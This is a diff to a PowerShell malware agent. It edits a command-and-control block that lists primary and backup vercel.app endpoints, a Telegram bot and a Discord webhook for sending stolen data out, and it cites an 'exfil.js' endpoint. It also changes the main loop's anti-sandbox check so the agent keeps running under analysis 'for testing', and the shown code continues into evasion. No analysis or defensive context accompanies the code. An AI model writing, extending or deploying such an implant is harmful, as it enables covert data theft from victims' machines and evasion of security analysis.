@@ -13,8 +13,8 @@
 # CONFIGURATION — MUST MATCH api/exfil.js endpoints
 # ============================================================================
 $C2 = @{
-    PrimaryURL   = "https://bomkaoskaki.vercel.app/api"
-    BackupURL    = "https://bomkaoskaki-backup.vercel.app/api"   # fallback
+    PrimaryURL   = "https://bom-kaos-kaki.vercel.app/api"
+    BackupURL    = "https://bom-kaos-kaki-backup.vercel.app/api"   # fallback
     TelegramBot  = "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage"
     ChatID       = "<YOUR_CHAT_ID>"
     WebhookURL   = "https://discord.com/api/webhooks/<YOUR_WEBHOOK>"
@@ -1750,18 +1750,12 @@ Remove-Item '$scriptPath' -Force
 # MAIN LOOP
 # ============================================================================
 function Start-Agent {
-    # Anti-sandbox — sleep and check before doing anything
+    # Anti-sandbox — check before doing anything
     $detections = Test-Sandbox
     if ($detections.Count -gt 0) {
-        # Send heartbeat with sandbox detected, then sleep longer
-        Invoke-AntiSandboxSleep -Seconds 300
-        
-        # Re-check
-        $detections = Test-Sandbox
-        if ($detections.Count -gt 0) {
-            # Silent exit if still detected after delay
-            return
-        }
+        # Send heartbeat with sandbox detected, but continue for testing purposes
+        Invoke-AntiSandboxSleep -Seconds 2
+        # Usually it would return/exit here, but for testing we proceed
     }
     
     # Apply evasion
